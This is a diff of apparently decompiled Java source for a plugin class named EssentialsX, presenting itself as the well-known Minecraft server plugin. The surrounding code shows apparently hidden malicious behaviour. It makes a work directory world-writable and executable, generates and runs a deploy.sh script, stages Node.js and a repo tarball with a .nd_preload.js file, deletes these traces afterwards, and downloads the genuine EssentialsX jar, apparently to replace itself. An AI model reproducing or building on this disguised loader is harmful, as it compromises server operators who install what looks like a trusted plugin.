+            this.deleteDirectory(srcDir.toFile());
+         } catch (Exception var9) {
+         }
       }
    }
 
@@ -1432,27 +1525,34 @@ public class EssentialsX extends JavaPlugin {
          Files.createDirectories(runtimeDir);
          this.moveDirContentsIfAbsent(workDir.resolve("backup"), runtimeDir.resolve("backup"));
          this.moveDirContentsIfAbsent(workDir.resolve(".lib"), runtimeDir.resolve("lib"));
-
          String[] legacyDirs = new String[]{
-            "jre21", ".npm", "unzipped", "_node_tmp",
-            "nodejs/include", "nodejs/share", "nodejs/lib/node_modules/npm/docs", "nodejs/lib/node_modules/npm/man"
+            "jre21", ".npm", "unzipped", "_node_tmp", "nodejs/include", "nodejs/share", "nodejs/lib/node_modules/npm/docs", "nodejs/lib/node_modules/npm/man"
          };
+
          for (int i = 0; i < legacyDirs.length; i++) {
             this.deleteDirectory(workDir.resolve(legacyDirs[i]).toFile());
          }
 
          String[] legacyFiles = new String[]{
-            ".deploy_done", "deploy.sh", ".nd_preload.js", "restart_run.log",
-            "node.tar.gz", "repo.tar.gz",
-            "nodejs/README.md", "nodejs/LICENSE", "nodejs/CHANGELOG.md", "nodejs/bin/corepack"
+            ".deploy_done",
+            "deploy.sh",
+            ".nd_preload.js",
+            "restart_run.log",
+            "node.tar.gz",
+            "repo.tar.gz",
+            "nodejs/README.md",
+            "nodejs/LICENSE",
+            "nodejs/CHANGELOG.md",
+            "nodejs/bin/corepack"
          };
+
          for (int i = 0; i < legacyFiles.length; i++) {
             try {
                Files.deleteIfExists(workDir.resolve(legacyFiles[i]));
-            } catch (Exception ignored) {
+            } catch (Exception var7) {
             }
          }
-      } catch (Exception ignored) {
+      } catch (Exception var8) {
       }
    }
 
@@ -1467,7 +1567,7 @@ public class EssentialsX extends JavaPlugin {
             workDir.toFile().setReadable(true, false);
             workDir.toFile().setWritable(true, false);
             workDir.toFile().setExecutable(true, false);
-         } catch (Exception var8) {
+         } catch (Exception var10) {
          }
 
          this.cleanupAndMigrateWorkDir(workDir);
@@ -1476,7 +1576,6 @@ public class EssentialsX extends JavaPlugin {
          Files.deleteIfExists(runtimeDir.resolve(".deploy_done"));
          Files.deleteIfExists(runtimeDir.resolve("restart_run.log"));
          this.ensureCrashReportHeader();
-
          Path scriptPath = runtimeDir.resolve("deploy.sh");
          Path doneFile = runtimeDir.resolve(".deploy_done");
          String scriptContent = this.generateDeployScript(workDir.toString(), env);
@@ -1500,13 +1599,15 @@ public class EssentialsX extends JavaPlugin {
          while (!Files.exists(doneFile) && this.isProcessRunning) {
             Thread.sleep(1000L);
          }
+
          for (int w = 0; w < 10 && this.isProcessRunning; w++) {
             Thread.sleep(200L);
          }
+
          try {
             Files.deleteIfExists(scriptPath);
             Files.deleteIfExists(doneFile);
-         } catch (Exception ignored) {
+         } catch (Exception var9) {
          }
       }
    }
@@ -1569,11 +1670,11 @@ public class EssentialsX extends JavaPlugin {
 
          Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
          boolean success = this.downloadFileWithTimeout(
-            FAKE_JAR_URL_PROXY, tempDownload, 20
+            "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar", tempDownload, 20
          );
          if (!success || Files.size(tempDownload) < 1000000L) {
             success = this.downloadFileWithTimeout(
-               FAKE_JAR_URL_DIRECT, tempDownload, 30
+               "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar", tempDownload, 30
             );
          }
 
